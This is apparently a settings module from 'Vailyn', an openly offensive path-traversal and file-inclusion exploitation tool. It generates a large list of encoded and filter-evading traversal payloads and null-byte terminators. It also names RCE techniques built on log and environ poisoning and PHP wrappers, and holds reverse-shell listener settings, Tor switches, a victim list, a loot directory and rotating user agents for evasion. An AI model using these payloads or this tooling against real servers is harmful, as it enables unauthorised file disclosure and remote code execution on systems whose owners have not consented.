#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import multiprocessing
import sys
import os

isWindows = sys.platform.lower().startswith("win")

def generatePayloads():
    """
    generate payload list from a variety of dots and slashes
    """
    dots = ['..', '. . ', '%2e%2e', '0x2e0x2e', '%252e%252e', '..;', '%c0%2e%c0%2e', '%e0%80%ae%e0%80%ae',
            '%c0%ae%c0%ae', '%25c0%25ae%25c0%25ae', '%%32%65%%32%65', '%uff0e%uff0e', '%e0%ae%e0%ae',
            '%u002e%u002e', '%25%32%65%25%32%65', '%%c0%6e%c0%6e', '%c0%5e%c0%5e',
            '%c0%ee%c0%ee', '%c0%fe%c0%fe', '%f0%80%80%ae%f0%80%80%ae', '.%2e', '%2e.']
    slashes = ['/', '\\', '%2f', '0x2f', '%255c', '%252f', '%5c', '%c0%2f', '0x5c', '%c0%af', '%c1%9c',
               '%25c1%259c', '%%32%66', '%%35%63', '%u2215', '%u2216', '%uEFC8', '%uF025', '%e0%af',
               '%e0%80%af', '%c0%5c', '%c0%9v', '%c0%qf', '%c1%8s', '%c1%1c', '%c1%af', '%bg%qf', '%25c0%25af']
    special = ['./', '.\\', '....//', '....\\\\', '...//', '...\\\\', '.....///', '.....\\\\\\', '..\\/',
               '../\\', '..././', '...\\.\\', '..................................................../',
               '....................................................\\', '.?/', '?./', '??/']

    plist = []
    for dot in list(set(dots)):
        for slash in list(set(slashes)):
            plist.append(dot+slash)

    plist = plist + special
    return plist


payloadlist = generatePayloads()

nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']

wrapperCount = 4

rce = {
    1: "/proc/self/environ Poisoning",
    2: "Apache Access Log Poisoning",
    3: "SSH Log Poisoning",
    4: "Poisoned Mail to Web User",
    5: "Nginx Access Log Poisoning",
    6: "Wrapper RCE ({} submodules)".format(wrapperCount)
}

# Tor variables
tor = False
initip = ""
torip = ""

timeout = None

# reverse shell variables
revshell = False
LISTENIP = None
LISTENPORT = None

# crawler list
viclist = []

# arjun stable switch
stable = False

# precise depth flag
precise = False

# clear the terminal, supports both Windows and Unix-like
CLEAR_CMD = ["cmd", "/c", "cls"] if isWindows else ["clear"]

# directory separator
SEPARATOR = "\\" if isWindows else "/"

# set maximal amount of processes
processes = multiprocessing.cpu_count()

lootdir = SEPARATOR.join([os.path.dirname(os.path.realpath("__main__")), "loot", ""])
cachedir = SEPARATOR.join([os.path.dirname(os.path.realpath("__main__")), "core", "payload-cache", ""])

verbose = False

version = ""
e_version = ""
with open("core/doc/VERSION", "r") as versionfile:
    e_version = versionfile.read().strip()
version = ".".join(e_version.split(".")[0:-1])

user_agents = [
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
    "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101Firefox/28.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
    "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
]
